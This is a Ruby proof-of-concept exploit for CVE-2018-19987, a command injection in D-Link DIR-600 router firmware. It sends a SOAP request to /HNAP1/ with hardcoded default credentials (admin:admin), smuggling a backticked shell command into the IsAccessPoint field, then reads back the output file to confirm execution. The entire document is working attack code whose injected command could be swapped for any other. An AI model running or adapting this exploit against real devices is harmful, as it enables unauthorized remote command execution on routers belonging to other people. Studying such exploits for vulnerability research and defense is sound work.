CVE-2018-19987.rb

#!/usr/bin/env ruby
# CVE-2018-19987 - /HNAP1/SetAccessPointMode
# tested against DIR600B_FW205b01.bin
require 'rex'

begin

sock = Rex::Proto::Http::Client.new('', 
                                    port = '', 
                                    context = {}, 
                                    ssl = false)

xml = %Q|
<?xml version="1.0" encoding="utf­8"?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema­instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <soap:Body>
  <SetAccessPointMode xmlns="http://purenetworks.com/HNAP1/">
<IsAccessPoint>`uname -a > ../../www/lalo.txt`</IsAccessPoint></SetAccessPointMode>
  </soap:Body>
</soap:Envelope>
|

req = sock.request_cgi(
{
	'uri'   => '/HNAP1/',
	'version' => '1.1',
	'method' => 'POST',
               'data' => xml,
               'headers' => {
                # hardcoded
                'Authorization' => 'Basic ' + Rex::Text.encode_base64('admin:admin'), 
                'SOAPAction' => 'http://purenetworks.com/HNAP1/SetAccessPointMode',
               },
})

sock.send_request(req)
data = sock.read_response()

 if data and data.body.include?('OK')
  puts '[*] Good'
  req = sock.request_raw({'uri' => '/lalo.txt',})
  sock.send_request(req)
  data = sock.read_response()
  puts data.body
 else
  puts '[!] Error'
 end
rescue => e
puts '[!] ' + e.to_s
end
